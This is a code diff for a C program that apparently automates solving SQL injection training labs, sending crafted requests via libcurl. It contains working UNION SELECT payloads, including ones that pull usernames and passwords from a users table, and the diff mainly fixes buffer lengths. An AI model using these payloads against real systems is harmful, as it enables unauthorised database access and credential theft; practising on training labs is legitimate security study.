@@ -240,7 +240,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
     strncpy(url_temp, url, strlen(url) + 1);
 
     curl = curl_easy_init();
-    if (curl == NULL)
+    if (!curl)
         goto quit;
 
     set_curl_settings(curl, url, response_buffer, header_buffer);
@@ -282,7 +282,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
             loop_until_column_count++;
         }
-        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
+        snprintf(url, 300, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -297,7 +297,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
             loop_until_column_count--;
         }
-        snprintf(url, 150, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
+        snprintf(url, 300, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -315,7 +315,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
             loop_until_column_count++;
         }
-        snprintf(url, 150, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
+        snprintf(url, 300, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -331,7 +331,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
             loop_until_column_count++;
         }
-        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
+        snprintf(url, 300, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -369,7 +369,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
             loop_until_column_count++;
         }
-        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
+        snprintf(url, 300, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -414,7 +414,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
             f++;
         }
-        snprintf(url, 200, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
+        snprintf(url, 300, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
 
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
@@ -471,7 +471,7 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
 
         column_count = 1;
         while (column_count) {
-            strncat(sqli_payload_mid, ",NULL", 5);
+            strncat(sqli_payload_mid, ",NULL", 6);
             snprintf(url, 150, "%s/filter?category=Accessories%s%s%s", url_temp, sqli_payload, sqli_payload_mid, sqli_payload_end);
             curl_easy_setopt(curl, CURLOPT_URL, url);
 
@@ -520,18 +520,18 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
             test_column++;
 
             // for reset sqli_payload
-            strncat(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 47);
+            strncat(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 48);
 
         }
     }
     else if (lab_to_be_solved == 9) {
         // Lab name: "SQL injection UNION attack, retrieving data from other tables"
-        strncat(url, "/filter?category=Accessories'+UNION+SELECT+'abc','def'--", 56);
+        strncat(url, "/filter?category=Accessories'+UNION+SELECT+'abc','def'--", 57);
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
 
         clear_url(url);
-        strncat(url, "/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", 74);
+        strncat(url, "/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", 75);
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
 
@@ -543,12 +543,12 @@ int redirect_to_the_solution_and_solve_the_lab(char *url) {
     }
     else if (lab_to_be_solved == 10) {
         // Lab name: "SQL injection UNION attack, retrieving multiple values in a single column"
-        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", 55);
+        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", 56);
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
 
         clear_url(url);
-        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", 84);
+        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", 85);
         curl_easy_setopt(curl, CURLOPT_URL, url);
         performCurlRequest(curl, response_buffer, header_buffer);
 
@@ -721,7 +721,7 @@ int main() {
     show_paas_ascii_art();
     
     printf("\033[38;5;208mLab URL\033[0m: ");
-    if (fgets(input_url, 200, stdin) != NULL) {
+    if (fgets(input_url, 300, stdin) != NULL) {
         if (clear_url(input_url) == 1) {
             if (redirect_to_the_solution_and_solve_the_lab(input_url) == 0) {
                 printf("[+] Lab successfully solved!\n");
